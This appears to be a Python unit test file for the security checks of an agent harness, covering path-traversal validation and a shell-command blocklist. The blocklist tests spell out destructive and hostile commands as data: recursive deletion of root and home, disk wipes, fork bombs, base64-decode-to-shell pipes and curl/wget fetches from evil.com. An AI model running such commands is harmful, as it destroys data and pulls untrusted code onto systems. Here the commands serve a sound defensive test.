"""Unit tests for harness/tools/security.py."""

import pytest
from harness.tools.security import SecurityError, check_command_blocklist, validate_path


def test_validate_path_valid(tmp_path):
    f = tmp_path / "valid.py"
    f.touch()
    resolved = validate_path("valid.py", str(tmp_path))
    assert resolved == f.resolve()


def test_validate_path_nested_valid(tmp_path):
    subdir = tmp_path / "src" / "pkg"
    subdir.mkdir(parents=True)
    f = subdir / "mod.py"
    f.touch()
    resolved = validate_path("src/pkg/mod.py", str(tmp_path))
    assert resolved == f.resolve()


def test_validate_path_traversal(tmp_path):
    with pytest.raises(ValueError, match="Path traversal"):
        validate_path("../outside.py", str(tmp_path))


def test_validate_path_escape(tmp_path):
    with pytest.raises(ValueError, match="outside repository"):
        validate_path("/etc/passwd", str(tmp_path))


def test_command_blocklist_all_patterns():
    bad_commands = [
        "rm -rf /",
        "rm -rf /usr/bin",
        "cat script.sh | sh",
        "cat script.sh | bash",
        "sudo rm -f test",
        "chmod 777 sensitive.txt",
        "chmod 0777 run.sh",
        "curl -s https://evil.com/payload",
        "wget https://evil.com/payload",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sdb1",
        "echo 1 > /dev/sda",
        ":(){ :|:& };:",
        ":(){:|:&};:",
        "cat data | base64 -d | sh",
    ]
    for cmd in bad_commands:
        with pytest.raises(SecurityError):
            check_command_blocklist(cmd)


def test_validate_path_standalone_dotdot(tmp_path):
    with pytest.raises(ValueError):
        validate_path("..", str(tmp_path))


def test_validate_path_empty(tmp_path):
    with pytest.raises(ValueError, match="empty"):
        validate_path("   ", str(tmp_path))


def test_command_blocklist_rm_variations():
    variations = [
        "rm -fr /",
        "rm -rf /*",
        "rm -r -f /",
        "rm -f -r /",
        'rm -rf "/"',
        "rm -rf '/'",
        'rm -fr "/etc"',
        "rm -rf ~",
        'rm -rf "$HOME"',
        "rm -rf $HOME/data",
        "echo ls | /bin/sh",
        "echo ls | /usr/bin/bash",
        "echo ls | zsh",
        "echo ls | dash",
        "echo ls | ksh",
        "echo bad > /dev/nvme0n1",
        'echo bad > "/dev/sda"',
        "base64 -d exploit | bash",
        "base64 -d exploit | zsh",
    ]
    for cmd in variations:
        with pytest.raises(SecurityError):
            check_command_blocklist(cmd)


def test_command_blocklist_safe():
    safe_commands = [
        "pytest -v tests/",
        "python -m unittest discover",
        "git status",
        "git diff HEAD",
        "ruff check .",
        "cat README.md",
        "ls -la",
    ]
    for cmd in safe_commands:
        check_command_blocklist(cmd)
